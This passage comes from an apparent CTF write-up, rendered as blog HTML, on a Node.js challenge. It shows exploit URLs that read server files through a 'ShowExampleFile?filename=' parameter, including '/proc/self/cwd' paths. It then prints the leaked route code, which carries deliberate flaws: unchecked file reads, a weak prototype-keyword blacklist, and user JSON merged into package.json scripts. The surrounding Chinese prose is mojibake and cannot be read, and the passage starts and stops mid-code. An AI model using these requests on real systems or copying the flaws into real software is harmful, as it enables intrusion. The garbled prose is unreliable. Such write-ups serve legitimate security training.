class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®è¿™ä¸ªä»£ç </p><p><img src="../images/image-20230504193939368.png" alt="image-20230504193939368"></p><p><img src="../images/image-20230504194038107.png" alt="image-20230504194038107"></p><p>è¿™å°±æ˜¯å¼•å…¥çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡Œè¿™ä¸ªæ–‡ä»¶çš„è¯»å–ï¼Œçœ‹é‡Œé¢æœ‰å•¥åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä¸€å¼€å§‹è¿˜æŠ¥é”™æ˜¯å› ä¸ºæ²¡æœ‰åŠ åç¼€.jsï¼Œå°±å¥½åƒè®¿é—®phpé¡µé¢ä¸åŠ phpä¸€æ ·</span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=/proc/self/cwd/routes/dashbo</span><br><span class="line">ardIndex.js</span><br><span class="line"></span><br><span class="line">è¿™ä¸ªè·¯å¾„å¯èƒ½ä¹Ÿæ˜¯è¿™ä¸ªæ¡†æ¶é»˜è®¤çš„è·¯å¾„å§ï¼Œåº”è¯¥å’Œthinkphpå·®ä¸å¤š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=./routes/dashboardIndex.js</span><br><span class="line">ä¸Šé¢çš„äºŒç§æ–¹æ³•éƒ½å¯ä»¥å®ç°</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230504194423815.png" alt="image-20230504194423815"></p><p>è¯»å–åˆ°çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/tmp&quot;</span>)&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileData</span>(<span class="params">fileDatas</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileDatas.<span class="title function_">includes</span>(blacklist[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get example file</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/ShowExampleFile&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;app&quot;</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">filename</span> || <span class="string">&quot;./example/example.json&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Home&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>:<span class="string">&quot;Welcome back&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/getHint2&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> hintName = <span class="string">&quot;hint2.png&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../hints&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(hintName,options,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Get hint2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// show uploaded files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/UploadList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No uploaded files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: lists,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// show packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PacksList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No packed files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lists.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        result += <span class="string">&quot;&lt;a href=&#x27;/dashboardIndex/DownloadPackage?name=&quot;</span> + lists[i] + <span class="string">&quot;&#x27;&gt;&quot;</span> + lists[i] + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: result,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Download packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/DownloadPackage&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">query</span>.<span class="property">name</span> === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        req.<span class="property">query</span>.<span class="property">name</span> = <span class="string">&quot;example.tgz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> packageName = req.<span class="property">query</span>.<span class="property">name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>) !== -<span class="number">1</span> || packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;..&quot;</span>) !== -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;.tgz&quot;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a package file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packagePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs/&quot;</span>,packageName);</span><br><span class="line">    <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(packagePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> contentType = <span class="string">&quot;application/x-gtar&quot;</span>;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + packageName);</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-type&quot;</span>, contentType);</span><br><span class="line">    res.<span class="title function_">download</span>(packagePath,packageName,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Download failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload files</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/Upload&quot;</span>,upload.<span class="title function_">any</span>(),<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;upload&quot;</span>,&#123;<span class="attr">upload_result</span>:<span class="string">&quot;plz upload file&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;No files were uploaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> file = req.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> fileData = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(fileData))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File data invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload/&quot;</span>,file.<span class="property">originalname</span>);</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>) === <span class="string">&quot;.json&quot;</span>) &#123;</span><br><span class="line">            fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload error&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload success&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Not a JSON file&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set dependencies</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> 